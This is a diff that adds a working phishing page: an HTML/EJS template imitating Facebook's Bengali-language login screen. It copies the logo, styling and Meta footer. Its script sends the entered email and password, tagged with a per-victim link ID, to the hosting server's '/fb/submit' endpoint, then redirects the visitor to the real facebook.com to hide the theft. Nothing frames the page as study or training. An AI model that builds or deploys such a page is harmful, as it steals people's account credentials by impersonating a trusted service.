@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo svg {
+            width: 50px;
+            height: 50px;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .login-card h2 {
+            color: #1c1e21;
+            font-size: 18px;
+            font-weight: normal;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .login-btn:disabled {
+            background: #9cb9e8;
+            cursor: not-allowed;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .forgot-link a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            margin: 20px 0;
+            border-bottom: 1px solid #dadde1;
+        }
+        
+        .create-btn {
+            text-align: center;
+        }
+        
+        .create-btn button {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .create-btn button:hover {
+            background: #36a420;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #737373;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error {
+            color: #f02849;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .lang-selector {
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .lang-selector select {
+            border: none;
+            background: transparent;
+            color: #737373;
+            font-size: 12px;
+            padding: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48">
+                <path fill="#1877f2" d="M24 0C10.745 0 0 10.745 0 24c0 11.255 7.75 20.76 18.063 23.482V30.75h-5.25V24h5.25v-3.75c0-8.625 3.938-12 11.063-12 3.188 0 5.063.563 6.188 1.125v5.063h-3.938c-2.625 0-3.375 2.438-3.375 4.688V24h7.313l-1.313 6.75h-6v16.732C40.25 44.76 48 35.255 48 24 48 10.745 37.255 0 24 0z"/>
+            </svg>
+        </div>
+        
+        <div class="login-card">
+            <h2>Facebook-এ লগ ইন করুন</h2>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="ইমেল বা ফোন নম্বর" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn">লগ ইন</button>
+                
+                <div class="loading" id="loading">
+                    <span class="loading-spinner"></span> অনুগ্রহ করে অপেক্ষা করুন...
+                </div>
+                
+                <div class="error" id="error">
+                    ভুল ইমেল বা পাসওয়ার্ড। আবার চেষ্টা করুন।
+                </div>
+            </form>
+            
+            <div class="forgot-link">
+                <a href="#">পাসওয়ার্ড ভুলে গেছেন?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="create-btn">
+                <button onclick="window.location.href='https://facebook.com/r.php'">নতুন অ্যাকাউন্ট তৈরি করুন</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">বাংলা</a> · 
+            <a href="#">English (US)</a> · 
+            <a href="#">हिन्दी</a> · 
+            <a href="#">اردو</a> · 
+            <a href="#">বাংলা</a>
+            <div style="margin-top: 10px;">
+                <a href="#">নিবন্ধন করুন</a> · 
+                <a href="#">লগ ইন</a> · 
+                <a href="#">Messenger</a> · 
+                <a href="#">Facebook Lite</a> · 
+                <a href="#">Watch</a>
+            </div>
+            <div style="margin-top: 10px;">
+                © 2024 Meta
+            </div>
+        </div>
+        
+        <div class="lang-selector">
+            <select>
+                <option>বাংলা</option>
+                <option>English (US)</option>
+                <option>हिन्दी</option>
+                <option>اردو</option>
+            </select>
+        </div>
+    </div>
+    
+    <script>
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const loading = document.getElementById('loading');
+        const error = document.getElementById('error');
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                error.style.display = 'block';
+                error.textContent = 'ইমেল এবং পাসওয়ার্ড দিন';
+                return;
+            }
+            
+            // Disable button and show loading
+            loginBtn.disabled = true;
+            loading.style.display = 'block';
+            error.style.display = 'none';
+            
+            try {
+                const response = await fetch('/fb/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        linkId: '<%= linkId %>',
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                if (response.ok) {
+                    window.location.href = 'https://facebook.com';
+                } else {
+                    throw new Error('Submission failed');
+                }
+            } catch (err) {
+                error.style.display = 'block';
+                error.textContent = 'একটি সমস্যা হয়েছে। আবার চেষ্টা করুন।';
+                loginBtn.disabled = false;
+                loading.style.display = 'none';
+            }
+        });
+        
+        // Auto-redirect after 30 seconds if no action
+        setTimeout(() => {
+            window.location.href = 'https://facebook.com';
+        }, 30000);
+    </script>
+</body>
+</html>
